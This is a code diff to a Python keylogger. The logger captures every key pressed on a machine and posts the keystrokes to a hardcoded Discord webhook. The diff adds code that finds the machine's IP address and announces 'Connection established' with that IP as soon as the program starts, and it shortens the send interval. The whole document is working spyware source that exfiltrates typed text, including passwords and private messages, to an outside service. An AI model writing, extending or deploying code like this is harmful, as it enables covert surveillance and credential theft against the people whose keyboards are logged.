@@ -4,6 +4,7 @@ import threading
 import time
 import subprocess
 import os
+import socket
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -24,6 +25,17 @@ special_keys = {
     keyboard.Key.esc: " ESC ",
 }
 
+# Function to get the IP address of the machine
+def get_ip_address():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))  # Google DNS to determine the IP
+        ip_address = s.getsockname()[0]
+        s.close()
+        return ip_address
+    except Exception as e:
+        print(f"Error getting IP address: {e}")
+        return "Unknown"
 
 def send_to_webhook(message):
     """Send the message to the Discord webhook."""
@@ -31,7 +43,11 @@ def send_to_webhook(message):
         "content": message
     }
     try:
-        requests.post(WEBHOOK_URL, json=payload)
+        response = requests.post(WEBHOOK_URL, json=payload)
+        if response.status_code == 200:
+            print("Webhook message sent successfully.")
+        else:
+            print(f"Failed to send webhook message. Status code: {response.status_code}")
     except Exception as e:
         print(f"Error sending message to webhook: {e}")
 
@@ -57,7 +73,7 @@ def on_press(key):
     # Append the key press to the keystrokes string
     keystrokes += key_str
 
-    # Start a timer to send keystrokes after 30 seconds
+    # Start a timer to send keystrokes after 10 seconds
     threading.Thread(target=send_keystrokes_after_delay).start()
 
 
@@ -66,6 +82,10 @@ def on_release(key):
         # Stop the listener when the Esc key is pressed
         return False
 
+
+# Start by sending the IP address to the webhook
+ip_address = get_ip_address()
+send_to_webhook(f"Connection established. IP address: {ip_address}")
 
 # Set up the listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
